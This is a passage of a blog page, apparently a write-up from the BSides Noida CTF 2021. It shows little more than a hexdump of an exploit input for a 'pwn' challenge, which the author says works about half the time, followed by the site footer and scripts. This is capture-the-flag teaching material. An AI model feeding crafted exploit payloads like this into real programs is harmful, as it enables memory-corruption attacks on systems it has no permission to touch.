</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Pwn (works at about 50% probability)

00000000  61 30 30 30 61 30 30 30 61 30 30 30 61 30 30 30  |a000a000a000a000|
00000010  61 30 30 30 61 30 30 30 61 30 30 30 61 30 30 30  |a000a000a000a000|
00000020  61 89 30 81 61 8a 30 82 61 8b 30 83 61 35 33 33  |a.0.a.0.a.0.a533|
00000030  61 36 33 33 61 33 33 34 61 35 35 33 61 33 33 33  |a633a334a553a333|
00000040  61 36 36 33 61 33 33 33 61 31 31 33 61 35 35 33  |a663a333a113a553|
00000050  61 36 36 33 61 33 33 33 61 30 30 33 61 31 31 33  |a663a333a003a113|
00000060  61 32 32 33 61 35 35 33 61 36 36 33 61 33 33 33  |a223a553a663a333|
00000070  61 30 30 33 61 31 31 33 61 32 32 33 61 33 33 33  |a003a113a223a333|
00000080  61 31 31 33 61 35 35 33 61 33 33 33 61 31 31 33  |a113a553a333a113|
00000090  61 35 35 33 61 33 33 33 61 33 33 33 61 30 30 33  |a553a333a333a003|
000000a0  61 31 31 33 61 35 35 33 61 36 36 33 61 33 33 33  |a113a553a663a333|
000000b0  61 35 35 33 61 36 36 33 61 33 33 33 61 35 35 33  |a553a663a333a553|
000000c0  61 36 36 33 61 33 33 33 61 33 33 33 61 35 35 33  |a663a333a333a553|
000000d0  61 36 36 33 61 33 33 33 61 36 36 33 61 33 33 33  |a663a333a663a333|
000000e0  61 35 35 33 61 36 36 33 73 33 33 33 73 88 80 30  |a553a663s333s..0|
000000f0  61 30 30 34 73 80 80 30 72 30 31 61 84 30 35 61  |a004s..0r01a.05a|
00000100  8c 30 36 61 31 31 34 72 30 31 61 85 30 32 61 30  |.06a114r01a.02a0|
00000110  30 34 61 8d 30 34 61 31 31 34 72 30 31 61 86 30  |04a.04a114r01a.0|
00000120  33 61 8e 30 33 61 31 31 34 72 30 31 61 87 30 33  |3a.03a114r01a.03|
00000130  61 8f 30 33 63 30 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |a.03c0----------|
00000140  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000150  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000160  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000170  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000180  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000190  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001a0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001b0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001c0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001d0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001e0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000001f0  2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000200  0a                                               |.|
</code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2021-08-18</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2021/08/bsides-noida-ctf-2021/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" data-title="BSides Noida CTF 2021"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2021/08/bsides-noida-ctf-2021/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" data-title="BSides Noida CTF 2021" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" data-title="BSides Noida CTF 2021"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" data-title="BSides Noida CTF 2021"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" data-title="BSides Noida CTF 2021" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" data-title="BSides Noida CTF 2021" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" data-title="BSides Noida CTF 2021"><i class="fab fa-evernote fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2021/07/qwb2021/" class="prev" rel="prev" title="强网杯总决赛 2021"><i class="fas fa-angle-left fa-fw"></i>强网杯总决赛 2021</a>
            <a href="/2021/08/hxp2020/" class="next" rel="next" title="Hxp2020">Hxp2020<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">🏴‍☠️ Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
